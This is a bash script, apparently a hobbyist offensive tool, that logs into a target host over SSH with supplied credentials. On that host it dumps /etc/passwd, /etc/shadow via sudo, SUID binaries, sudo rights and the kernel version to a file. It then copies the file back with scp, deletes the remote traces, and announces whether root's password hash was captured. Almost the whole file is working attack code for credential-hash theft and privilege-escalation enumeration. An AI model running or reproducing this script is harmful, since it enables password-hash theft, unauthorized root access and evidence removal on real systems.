#!/bin/bash

# ------------------------------------------------------
# Colors
# Usage: (echo -e or echo -e) "${COLOR}TEXT HERE${NOCOLOR}"
# ------------------------------------------------------
NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTGRAY='\033[0;37m'
DARKGRAY='\033[1;30m'
LIGHTRED='\033[1;31m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTPURPLE='\033[1;35m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'
#-------------------------------------------------------

###################################################################################################################
#Ensure the script is being ran as root or with sudo privileges
if [ "$(id -u)" -ne 0 ]; then
	echo -e "${RED}
████████╗██╗░░██╗██╗░██████╗  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗
╚══██╔══╝██║░░██║██║██╔════╝  ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝
░░░██║░░░███████║██║╚█████╗░  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░
░░░██║░░░██╔══██║██║░╚═══██╗  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░
░░░██║░░░██║░░██║██║██████╔╝  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═════╝░  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░

      ███╗░░░███╗██╗░░░██╗░██████╗████████╗  ██████╗░███████╗
      ████╗░████║██║░░░██║██╔════╝╚══██╔══╝  ██╔══██╗██╔════╝
      ██╔████╔██║██║░░░██║╚█████╗░░░░██║░░░  ██████╦╝█████╗░░
      ██║╚██╔╝██║██║░░░██║░╚═══██╗░░░██║░░░  ██╔══██╗██╔══╝░░
      ██║░╚═╝░██║╚██████╔╝██████╔╝░░░██║░░░  ██████╦╝███████╗
      ╚═╝░░░░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░  ╚═════╝░╚══════╝

██████╗░░█████╗░███╗░░██╗  ░█████╗░░██████╗  ██████╗░░█████╗░░█████╗░████████╗
██╔══██╗██╔══██╗████╗░██║  ██╔══██╗██╔════╝  ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
██████╔╝███████║██╔██╗██║  ███████║╚█████╗░  ██████╔╝██║░░██║██║░░██║░░░██║░░░
██╔══██╗██╔══██║██║╚████║  ██╔══██║░╚═══██╗  ██╔══██╗██║░░██║██║░░██║░░░██║░░░
██║░░██║██║░░██║██║░╚███║  ██║░░██║██████╔╝  ██║░░██║╚█████╔╝╚█████╔╝░░░██║░░░
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝  ╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝░╚════╝░░╚════╝░░░░╚═╝░░░${NOCOLOR}"
	exit 1
fi
###################################################################################################################
clear
sleep 1

MSG1="EXECUTING PROGRAM.........."
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG1"  
sleep 2
echo
echo
###################################################################################################################
#To create a directory for the script.
#This command needs to stay in this location

HOME1=$(pwd)
# We check that a working directory exists, if not we create one

[ ! -d "$HOME1/I_AM_ROOT/" ] && mkdir $HOME1/I_AM_ROOT/ && MSG2="CREATING DIRECTORY.........." || MSG3="DIRECTORY ALREADY EXISTS.........."
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG2"
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG3"

sleep 2
echo
echo
###################################################################################################################
#MSG=""
#while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG"

###################################################################################################################
#Checking for dependencies

MSG4="CHECKING FOR REQUIRED DEPENDENCIES.........."
MSG5="NON-EXISTENT DEPENDECIES WILL BE INSTALLED.........."

while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG4"
echo
echo
sleep 2
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG5"

sshpass -v >/dev/null
      if [ $? -gt 0 ]; then
            sudo apt install sshpass -y
fi

expect -v >/dev/null
      if [ $? -gt 0 ]; then
            sudo apt install expect -y
fi
sleep 1
clear
sleep 2

###################################################################################################################


echo -e "${GREEN}                                   wr^^        ^-q__                           ${NOCOLOR}"
sleep .1                             
echo -e "${GREEN}                               _dP                 9m_                         ${NOCOLOR}"
sleep .1
echo -e "${GREEN}                             _#P                     9#_                       ${NOCOLOR}"
sleep .1            
echo -e "${GREEN}                           d#@                       9#m                       ${NOCOLOR}"
sleep .1 
echo -e "${GREEN}                          d##                         ###                      ${NOCOLOR}"
sleep .1 
echo -e "${GREEN}                        J###                           ###L                    ${NOCOLOR}" 
sleep .1 
echo -e "${GREEN}                        {###K                         J###K                    ${NOCOLOR}"
sleep .1  
echo -e "${GREEN}                        ]####K        ___aaa___      J####F                    ${NOCOLOR}" 
sleep .1 
echo -e "${GREEN}                      __gmM######_  w#P^^   ^^9#m  _d#####Mmw__                ${NOCOLOR}"
sleep .1  
echo -e "${GREEN}                   _g##############mZ_         __g##############m_             ${NOCOLOR}"
sleep .1
echo -e "${GREEN}                 _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_           ${NOCOLOR}"  
sleep .1
echo -e "${GREEN}                a###^^          ,Z######@^ ^######^\g          ^^M##m          ${NOCOLOR}"
sleep .1
echo -e "${GREEN}               J#@^             0L  ^*##     ##@^  J#              *#K         ${NOCOLOR}"
sleep .1
echo -e "${GREEN}               #^               ##    ~_gmwgm_~    dF               ##_        ${NOCOLOR}"  
sleep .1
echo -e "${GREEN}              7F                 ^#_   ]#####F   _dK                 JE        ${NOCOLOR}"  
sleep .1
echo -e "${GREEN}              1                    *m__ ##### __g@^                   F        ${NOCOLOR}"  
sleep .1
echo -e "${GREEN}                                     ^PJ#####LP^                               ${NOCOLOR}"  
sleep .1
echo -e "${GREEN}               ^                       0######_                      ^         ${NOCOLOR}"  
sleep .1
echo -e "${GREEN}                                     _0########_                               ${NOCOLOR}"    
sleep .1
echo -e "${GREEN}                   .               _d#####^#####m__              ^             ${NOCOLOR}"
sleep .1
echo -e "${GREEN}                    ^*w_________am#####P^   ~9#####mw_________w*^              ${NOCOLOR}"
sleep .1
echo -e "${GREEN}                        ^^9@#####@M^^           ^^P@#####@M^^                  ${NOCOLOR}"


    

echo
sleep 1
printf '\e[0;31m%-6s\e[m' "$(tput bold)                                                                               
      @@@         @@@@@@   @@@@@@@@@@         @@@@@@@    @@@@@@    @@@@@@   @@@@@@@"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)  
      @@@        @@@@@@@@  @@@@@@@@@@@        @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)        
      @@!        @@!  @@@  @@! @@! @@!        @@!  @@@  @@!  @@@  @@!  @@@    @@!"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      !@!        !@!  @!@  !@! !@! !@!        !@!  @!@  !@!  @!@  !@!  @!@    !@!"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      !!@        @!@!@!@!  @!! !!@ @!@        @!@!!@!   @!@  !@!  @!@  !@!    @!!"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      !!!        !!!@!!!!  !@!   ! !@!        !!@!@!    !@!  !!!  !@!  !!!    !!!"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)   
      !!:        !!:  !!!  !!:     !!:        !!: :!!   !!:  !!!  !!:  !!!    !!:"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      :!:        :!:  !:!  :!:     :!:        :!:  !:!  :!:  !:!  :!:  !:!    :!:"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)  
       ::        ::   :::  :::     ::         ::   :::  ::::: ::  ::::: ::     ::"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)
      :           :   : :   :      :           :   : :   : :  :    : :  :      :     
                                                                               
"

###################################################################################################################
#Function to check IP address is in the proper format

function validateIP(){
    IP_ADDRESS="$1"
    #Check if the format looks right
    echo -e "$IP_ADDRESS" | grep -E -qE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' || return 1
    #Check that each octect is less than or equal to 255:
    echo -e "$IP_ADDRESS" | awk -F'.' '$1 <=255 && $2 <= 255 && $3 <=255 && $4 <= 255 {print "Y" } ' | grep -q Y || return 1
    return 0
}

echo 
sleep 2

###################################################################################################################
#Ask for user input
MSG11="ENTER IP ADDRESS: " 
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG11"
read -r IP_ADDRESS


[ ! -d "$HOME1/I_AM_ROOT/$IP_ADDRESS" ] && mkdir $HOME1/I_AM_ROOT/$IP_ADDRESS
      DEST=$HOME1/I_AM_ROOT/$IP_ADDRESS/

sleep 1

###################################################################################################################
# While loop to validate the IP provided, if ip is not valid then it will ask for a valid ip
while ! validateIP "$IP_ADDRESS"
      do
            MSG12="INVALID IP"
            while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG12"
            sleep .1
            echo
            echo
            MSG13="ENTER A VALID IP: " 
            while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG13"
            read -r IP_ADDRESS
done

echo
MSG11="ENTER USERNAME: "
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG11"
read -r USERNAME
echo
MSG12="ENTER PASSWORD: "
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG12"

read -s PASSWD
sleep 2

echo
echo

###################################################################################################################
#Spin function for show (Need to implement into a process)

SPINVAR1="ATTEMPTING TO CONNECT"
function progress(){

        spin(){
          while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$SPINVAR1" 
          spin1 &
          pid=$!


          for i in $(seq 1 7)
          do 
            sleep 1.5
          done

          kill $pid
          echo ""

        }

        spin1(){
          while [ 1 ]
          do
              echo -ne " ${GREEN}.${NOCOLOR}"
              sleep 1
          done  
        }
        spin
}
progress
echo
sleep 2
###################################################################################################################
# Variables

DIR=/home/$USERNAME/I_AM_ROOT/
F=Info.txt
SND="send \"echo '' >> $DIR${F}\r\""

###################################################################################################################
# Function with expect commands to ssh into remote host and execute commands. 
# It will attemp to gather info for possible privilge escalation

MSG13="EXECUTING COMMANDS, NO FURTHER USER INPUT NECESSARY PLEASE BE PATIENT.........." 
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG13"
echo
echo

function its_only_stealing_if_you_get_caught {
      expect -c "\
      set timeout 5 
      set env(TERM)
      spawn ssh -t "$USERNAME\@$IP_ADDRESS"
      send \"\r\"
      sleep 2 
      expect_before \"*(yes/no*\" {
      send \"yes\r\" 
      send \"$PASSWD\r\"
      }
      sleep 2
      expect \"*assword*\"
      send \"$PASSWD\r\"
      sleep 2
      send \"mkdir ${DIR}\r\"
      sleep 2
      send \"touch $DIR${F}\r\"
      sleep 1
      send \"echo -e 'I AM ROOTR RESULTS FOR ${IP_ADDRESS}' >> $DIR${F}\r\"
      ${SND}
      ${SND}
      ${SND}
      sleep 2
      send \"echo '############################## $USERNAME PATH ############################## ' >> $DIR${F}\r\"
      sleep 2
      ${SND}
      sleep 2
      send \"echo $PATH >> ${DIR}${F}\r\"
      sleep 2
      ${SND}
      send \"echo '##############################  /ETC/PASSWD ############################## ' >> $DIR${F}\r\"
      ${SND}
      send \"cat /etc/passwd >> ${DIR}${F}\r\"
      sleep 2
      ${SND}
      send \"echo '##############################  /ETC/SHADOW ############################## ' >> $DIR${F}\r\"
      ${SND}
      sleep 2
      send \"sudo cat /etc/shadow >> $DIR${F}\r\"
      sleep 2
      expect \"*assword*\"
      send \"$PASSWD\r\"
      sleep 1
      ${SND}
      ${SND}
      send \"echo '##############################  SUID FILES ##############################' >> $DIR${F}\r\"
      ${SND}
      send \"find / -perm -u=s -type f >> $DIR${F}\r\"
      expect \"*assword*\"
      send \"$PASSWD\r\"
      ${SND}
      send \"echo '##############################  SUDO COMMANDS ############################## ' >> $DIR${F}\r\"
      ${SND}
      sleep 2
      send \"sudo -l >> ${DIR}${F}\r\"
      sleep 1
      expect \"*assword*\"
      send \"$PASSWD\r\"
      sleep 2
      ${SND}
      send \"echo '##############################  KERNEL VERSION ############################## ' >> $DIR${F}\r\"
      ${SND}
      send \"uname -r >> ${DIR}${F}\r\"
      ${SND}
      sleep 2
      send \"exit\r\"
      "
}
its_only_stealing_if_you_get_caught

echo
echo
clear
sleep 2

MSG14="COMMAND EXECUTION COMPLETE......." 
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG14"
echo
echo

###################################################################################################################
# Commands to transfer the information and delete DIR in remote host.

MSG15="RETRIVING INFORMATION......."
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG15"
echo
echo

sleep 5
sshpass -p "$PASSWD" scp "$USERNAME"@"$IP_ADDRESS":"$DIR"${F} "$DEST"
sleep 5
current_time=$(date "+%Y.%m.%d-%H.%M.%S")
mv "$DEST"$F "$DEST""$IP_ADDRESS"-"$(date "+%Y.%m.%d-%H.%M.%S")"_.txt
Info="$DEST""$IP_ADDRESS"-"$(date "+%Y.%m.%d-%H.%M.%S")"_.txt

sshpass -p "$PASSWD" ssh "$USERNAME"@"$IP_ADDRESS" rm -r "$DIR"
sleep 3

###################################################################################################################
### Test phase for parsing information to the terminal### (Fisrt test succesful)

# Check for contents in the /ETC/SHADOW section of the file

grep '/ETC/SHADOW' -A2 "$Info" | grep 'root'
#positive result
if [ $? -eq 0 ]; then
	printf "


	THIS IS YOUR LUCKY DAY!!!
	THE GOD'S OF ENUMERATION HAVE DEEMED FIT 
	TO BESTOW THE KEY OF ROOT UPON YOU!!!
	"
# negative result
else
	printf "

	ENUMERATION DID NOT GRANT YOU A /ETC/SHADOW FILE
	"
fi
